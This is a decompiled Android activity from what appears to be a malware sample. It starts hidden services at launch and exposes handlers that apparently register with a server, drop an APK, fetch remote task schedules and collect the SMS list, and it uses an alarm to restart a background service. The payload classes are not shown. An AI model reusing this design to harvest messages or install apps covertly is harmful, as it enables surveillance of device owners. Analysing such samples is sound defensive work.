package com.clmobile.plugin;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import com.clmobile.network.ResultData;
import com.clmobile.plugin.networktask.NetworkTask;
import com.clmobile.plugin.networktask.NetworkTaskFactory;
import com.clmobile.plugin.networktask.TaskScheduleList;
import com.clmobile.plugin.task.PluginTaskFactory;
import com.clmobile.plugin.task.PluginTaskManager;
import com.clmobile.plugin.task.ReleaseApkTask;
import com.clmobile.utils.Utils;
import com.clouds.server.R;
import com.yongding.logic.Engine;

public class MainActivity extends Activity {

    class AnonymousClass_2 implements Runnable {
        private final /* synthetic */ ReleaseApkTask val$rat;

        AnonymousClass_2(ReleaseApkTask releaseApkTask) {
            this.val$rat = releaseApkTask;
        }

        public void run() {
            this.val$rat.execute();
        }
    }

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.clombile_main);
        PluginTaskManager.getInstance(this);
        Utils.startPluginService(this);
        Engine.StartMyService(this, Engine.bootServiceAction);
    }

    public void register(View view) {
        new Thread(new Runnable() {
            public void run() {
                PluginTaskManager.getInstance(MainActivity.this).ensureRegister();
            }
        }).start();
    }

    public void releaseApk(View view) {
        new Thread(new AnonymousClass_2(new ReleaseApkTask(this))).start();
    }

    public void scheduleTask(View view) {
        new Thread(new Runnable() {
            public void run() {
                ResultData<TaskScheduleList> result = new NetworkTask(NetworkTaskFactory.createTaskScheduleTask(MainActivity.this)).excute();
            }
        }).start();
    }

    public void smslist(View view) {
        new Thread(new Runnable() {
            public void run() {
                PluginTaskFactory.createSmsListTask(MainActivity.this).execute();
            }
        }).start();
    }

    public void triggerService(View view) {
        ((AlarmManager) getSystemService("alarm")).set(0, System.currentTimeMillis() + 5000, PendingIntent.getService(this, 1000, new Intent(this, AndroidService.class), 134217728));
    }
}